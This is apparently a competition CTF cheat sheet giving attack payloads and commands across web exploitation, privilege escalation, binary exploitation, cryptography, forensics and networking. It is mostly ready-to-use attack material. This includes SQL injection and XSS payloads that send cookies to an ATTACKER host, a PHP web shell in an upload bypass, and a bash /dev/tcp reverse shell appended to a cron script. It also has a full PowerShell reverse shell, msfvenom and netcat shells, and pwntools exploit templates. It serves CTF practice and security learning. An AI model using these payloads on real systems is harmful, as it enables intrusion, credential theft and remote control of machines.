# 🏴 CTF WAR HANDBOOK — Pro Player Cheatsheet

---

## 1. WEB EXPLOITATION

### SQL Injection
**Detect:** `'` `"` `1' OR '1'='1` → error/behavior change. Time-based: `' OR SLEEP(5)-- -`

**Union-based:**
```
' ORDER BY 10-- -                    # find column count
' UNION SELECT 1,2,3,4-- -           # find reflected columns
' UNION SELECT null,table_name,null FROM information_schema.tables-- -
' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT null,concat(username,0x3a,password),null FROM users-- -
```
**Error-based (MySQL):** `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -`

**Blind boolean:** `' AND 1=1-- -` vs `' AND 1=2-- -`

**Blind time:** `' AND IF(1=1,SLEEP(5),0)-- -`

**Auth bypass:** `admin'-- -` / `' OR 1=1-- -` / `admin' #`

**sqlmap:**
```
sqlmap -u "http://target/page?id=1" --dbs --batch
sqlmap -u "URL" -p id --dump -T users
sqlmap -r request.txt --level 5 --risk 3 --dbs
sqlmap -u "URL" --os-shell   # if DBA
```

### XSS
**Reflected/Stored basic:** `<script>alert(1)</script>`
**Filter bypass:**
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
<script>fetch('http://ATTACKER/?c='+document.cookie)</script>
```
**DOM XSS:** check `location.hash`, `innerHTML`, `document.write`, `eval()` sinks.
**Cookie steal payload:**
```html
<script>new Image().src="http://ATTACKER/steal?c="+document.cookie;</script>
```

### CSRF
- No CSRF token / token not validated / token reusable across users
- Auto-submit PoC:
```html
<form action="http://target/change_email" method="POST" id="f">
<input name="email" value="attacker@evil.com">
</form><script>document.getElementById('f').submit()</script>
```

### SSRF
```
http://127.0.0.1/
http://169.254.169.254/latest/meta-data/          # AWS cloud metadata
http://[::1]/
file:///etc/passwd
http://localhost:PORT
```
Bypass filters: `http://127.0.0.1.nip.io`, `http://0177.0.0.1`, `http://2130706433` (decimal IP), redirects via URL shorteners.

### IDOR
- Change `id=1001` → `id=1002`, swap UUIDs, change role param (`role=user`→`role=admin`), try `../` in API paths, test both GET/POST/PUT/DELETE on object endpoints.

### File Upload Bypass
```
shell.php.jpg
shell.php%00.jpg
shell.phtml / .phar / .pht / .php5 / .php7
Content-Type: image/png  (spoof header only)
GIF89a;<?php system($_GET['c']); ?>       # magic-byte + payload
```
Double extension, null byte, case (`.PhP`), race condition upload, polyglot files.

### LFI/RFI → RCE
```
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
?page=/proc/self/environ                 # LFI to RCE via User-Agent injection
?page=php://input   (POST body: <?php system('id'); ?>)
Log poisoning: inject PHP into User-Agent → include /var/log/apache2/access.log
```

### Auth Bypass Techniques
- SQLi in login, JWT `alg:none`, weak JWT secret (`hashcat`/`jwt_tool`), session fixation, default creds, password reset poisoning (Host header), 2FA bypass via response manipulation.

### WAF / Filter Bypass Tricks
```
UNION/**/SELECT     # comment split
UnIoN sElEcT         # case mixing
%55NION (double URL encode)
Chunked encoding to bypass length checks
<scr<script>ipt>     # nested tag stripping bypass
```

### Burp Suite Speed Tips
- Intruder: Sniper for single param fuzz, Cluster bomb for multi.
- Repeater: manual payload iteration.
- Match & Replace: auto-bypass headers (X-Forwarded-For, etc.).
- Decoder: quick base64/URL/hex flips.
- Use `Comparer` to diff responses for blind injection.

---

## 2. LINUX PRIVILEGE ESCALATION

**Enum one-liners:**
```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null        # SUID
find / -perm -2000 -type f 2>/dev/null        # SGID
getcap -r / 2>/dev/null                       # capabilities
cat /etc/crontab; ls -la /etc/cron.*
uname -a; cat /etc/*release
id; groups
env; echo $PATH
```
**Automated:** `linpeas.sh`, `linenum.sh`, `pspy` (cron monitoring, no root needed)

**SUID abuse (check GTFOBins):**
```bash
./binary_name -p        # e.g. find, vim, python, nmap, less
find . -exec /bin/sh -p \; -quit
```

**sudo misconfig:**
```bash
sudo -l
sudo /path/to/allowed_binary   # check GTFOBins for that binary's sudo bypass
```

**PATH hijacking:**
```bash
echo $PATH
# if script calls relative binary and writable dir precedes system path:
echo '/bin/sh' > /writable/dir/binaryname
chmod +x /writable/dir/binaryname
```

**Cron abuse:**
```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/
# if script is world-writable, append reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /path/to/cron_script.sh
```

**Capabilities abuse:**
```bash
getcap -r / 2>/dev/null
# e.g. python3 with cap_setuid
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

**Kernel exploits:** check `uname -r` → searchsploit / `linux-exploit-suggester.sh`. Common: DirtyCow, DirtyPipe (CVE-2022-0847), PwnKit (CVE-2021-4034), overlayfs.

**GTFOBins quick lookup:** `https://gtfobins.github.io/` — search binary name for `sudo`, `suid`, `shell`, `file-read` categories.

---

## 3. WINDOWS PRIVILEGE ESCALATION

**Enum:**
```powershell
whoami /priv
systeminfo
wmic qfe list
net user; net localgroup administrators
schtasks /query /fo LIST /v
reg query HKLM\SYSTEM\CurrentControlSet\Services
```
Automated: `winPEAS.exe`, `PowerUp.ps1`, `Seatbelt.exe`

**AlwaysInstallElevated:**
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o rev.msi
msiexec /quiet /qn /i rev.msi
```

**Unquoted service path:**
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
# if path like C:\Program Files\App\service.exe unquoted:
# drop malicious C:\Program.exe
```

**Token impersonation (JuicyPotato/PrintSpoofer):**
```powershell
.\PrintSpoofer.exe -i -c cmd
.\JuicyPotato.exe -l 1337 -p cmd.exe -t *
```

**Scheduled tasks abuse:** check writable task binaries/scripts, replace with payload.

**PowerShell reverse shell:**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 4. REVERSE ENGINEERING

**Ghidra workflow:** Import binary → Auto-analyze → check `main`, `strings`, cross-references (`Xrefs`) → rename vars for clarity → Decompile view for logic → patch bytes if needed.

**IDA workflow:** Load binary → Graph view for control flow → F5 (Hex-Rays decompile) → search strings (`Shift+F12`) → trace function calls.

**Strings tricks:**
```bash
strings binary | grep -i flag
strings -n 8 binary
strings binary | grep -E '[A-Za-z0-9+/]{20,}={0,2}'   # base64-looking
```

**Obfuscation patterns:** XOR-encoded strings, junk instructions, opaque predicates, packed binaries (`UPX` → `upx -d binary`), VM-based obfuscators.

**Crackme steps:**
1. Run binary, observe behavior.
2. `strings` for hardcoded checks.
3. Disassemble comparison logic (`cmp`, `je/jne`) near input.
4. Patch conditional jump OR brute-force valid input OR reverse the algorithm (write Python solver).

**Anti-debug bypass:**
```
IsDebuggerPresent → patch return to 0
timing checks (rdtsc) → NOP out
INT3 scanning → use hardware breakpoints instead
ptrace(PTRACE_TRACEME) self-attach → patch ptrace call to always return 0
```

---

## 5. BINARY EXPLOITATION

**Buffer overflow steps:**
```bash
# 1. Find offset
msf-pattern_create -l 200
# crash → get EIP/RIP value
msf-pattern_offset -l 200 -q <EIP_VALUE>
# 2. Control EIP/RIP, find bad chars, find JMP ESP/gadget, build payload
```

**pwntools template:**
```python
from pwn import *
context.binary = elf = ELF('./binary')
p = process('./binary')   # or remote('ip', port)

offset = 72
payload = b'A'*offset + p64(elf.symbols['win'])
p.sendline(payload)
p.interactive()
```

**ROP basics:**
```python
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])
payload = b'A'*offset + rop.chain()
```

**ret2libc:**
```python
libc = ELF('libc.so.6')
payload = b'A'*offset + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
```

**Format string attack:**
```python
# leak
payload = b'%7$p'  # adjust offset to hit stack arg
# write (via %n)
payload = fmtstr_payload(offset, {target_addr: value})
```

**Shellcode basics:**
```python
shellcode = asm(shellcraft.sh())   # pwntools generates /bin/sh execve shellcode
```
Check for NX (checksec), bypass with ROP if enabled. Check ASLR/PIE with `checksec ./binary`.

---

## 6. CRYPTOGRAPHY

**XOR:**
```python
# single-byte XOR bruteforce
for k in range(256):
    print(bytes([c ^ k for c in data]))
```
Known-plaintext XOR: `key = bytes(a^b for a,b in zip(ct, known_pt))`

**Caesar/substitution:** brute all 25 shifts, or use `dcode.fr` / `quipqiup.com` for substitution ciphers.

**RSA common flaws:**
- Small `e` (e=3) → cube root attack if no padding.
- Common modulus attack (same N, different e).
- Wiener's attack (small private exponent d).
- Shared prime factor across multiple public keys → GCD attack.
- Small N → factor via `factordb.com` or `RsaCtfTool`.
```bash
RsaCtfTool.py --publickey key.pub --uncipher cipher.txt
```

**Base encodings:**
```bash
echo "STRING" | base64 -d
echo "STRING" | base32 -d
python3 -c "print(bytes.fromhex('HEX'))"
```

**Hash cracking strategy:**
```bash
hashid hash.txt                          # identify hash type
john --wordlist=rockyou.txt hash.txt
hashcat -m 0 hash.txt rockyou.txt        # MD5
hashcat -m 1000 hash.txt rockyou.txt     # NTLM
```

**Online tools:** CyberChef (encoding/decoding swiss-army-knife), dcode.fr, factordb.com, crackstation.net.

---

## 7. FORENSICS

**File carving:**
```bash
binwalk -e file.bin
foremost -i file.img -o output/
file suspicious_file
exiftool file.jpg
```

**Steganography:**
```bash
steghide extract -sf image.jpg
zsteg image.png
stegsolve.jar          # bit-plane analysis GUI
strings image.jpg | tail
exiftool image.jpg      # check metadata for hidden text/comments
binwalk image.jpg       # check for embedded files
```

**Memory dump analysis (Volatility):**
```bash
vol.py -f mem.dump imageinfo
vol.py -f mem.dump --profile=PROFILE pslist
vol.py -f mem.dump --profile=PROFILE cmdscan
vol.py -f mem.dump --profile=PROFILE filescan
vol.py -f mem.dump --profile=PROFILE dumpfiles -Q 0xADDR -D out/
```

**Wireshark filters:**
```
http.request
ftp
tcp.port == 4444
dns
http contains "flag"
follow tcp stream (right-click → Follow → TCP Stream)
```

**Metadata extraction:**
```bash
exiftool file
strings file | grep -i "creator\|author"
```

---

## 8. NETWORKING

**Port scanning workflow:**
```bash
nmap -p- -T4 -oN allports.txt TARGET
nmap -sC -sV -p<found_ports> TARGET -oN detailed.txt
nmap --script vuln TARGET
```

**Common service exploits:**
```bash
# SSH: weak creds, key reuse
hydra -l user -P rockyou.txt ssh://TARGET

# FTP: anonymous login
ftp TARGET   # try anonymous:anonymous

# SMB
smbclient -L //TARGET/ -N
enum4linux -a TARGET
smbmap -H TARGET
crackmapexec smb TARGET -u user -p pass

# HTTP
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
```

**Netcat usage:**
```bash
nc -lvnp 4444                      # listener
nc TARGET 4444 -e /bin/sh          # reverse shell (if -e supported)
nc -lvnp 4444 > file.out           # receive file
nc TARGET 4444 < file.in           # send file
```

**Traffic analysis:** `tcpdump -i eth0 -w cap.pcap`, then open in Wireshark, follow streams for creds/flags.

---

## 9. TOOLS QUICK REFERENCE

| Tool | Purpose | Fast Command | When to Use |
|---|---|---|---|
| **nmap** | Port/service scan | `nmap -sC -sV -p- TARGET` | Initial recon |
| **Burp Suite** | Web proxy/fuzzing | Intercept → Repeater/Intruder | Any web target |
| **gobuster** | Dir/subdomain brute | `gobuster dir -u URL -w wordlist.txt -x php,txt` | Hidden endpoints |
| **ffuf** | Fast fuzzing | `ffuf -u URL/FUZZ -w wordlist.txt` | Param/dir/vhost fuzzing |
| **hydra** | Login brute force | `hydra -l user -P pass.txt ssh://TARGET` | Weak creds on services |
| **sqlmap** | SQLi automation | `sqlmap -u URL --batch --dbs` | Confirmed/suspected SQLi |
| **john** | Hash/password cracking | `john --wordlist=rockyou.txt hash.txt` | Offline hash cracking |
| **hashcat** | GPU hash cracking | `hashcat -m TYPE hash.txt rockyou.txt` | Large-scale/fast cracking |
| **metasploit** | Exploitation framework | `msfconsole` → `search`, `use`, `set RHOSTS`, `run` | Known CVEs, payload delivery |
| **ghidra** | Reverse engineering | GUI: import → analyze → decompile | Binary/crackme analysis |

---

## ⚡ SPEED-RUN CHECKLIST (first 5 minutes)
1. `nmap -sC -sV -p- TARGET`
2. Web found? → `gobuster`/`ffuf` dirs, check `robots.txt`, view source, check for known CVEs by tech stack.
3. SMB/FTP found? → anonymous login, `enum4linux`, `smbmap`.
4. Got a shell? → `sudo -l`, `find / -perm -4000`, `getcap -r /`, check cron, run `linpeas.sh`.
5. Got a binary? → `file`, `checksec`, `strings`, load in Ghidra.
6. Got a hash? → `hashid`, then `hashcat`/`john`.
7. Got a pcap? → open in Wireshark, `follow TCP stream`.
8. Stuck? → re-check source code, comments, metadata, and any base64/hex-looking strings.

---
*Compiled for competitive CTF speed-use. Verify payloads against target-specific filters — WAFs and sanitization vary.*
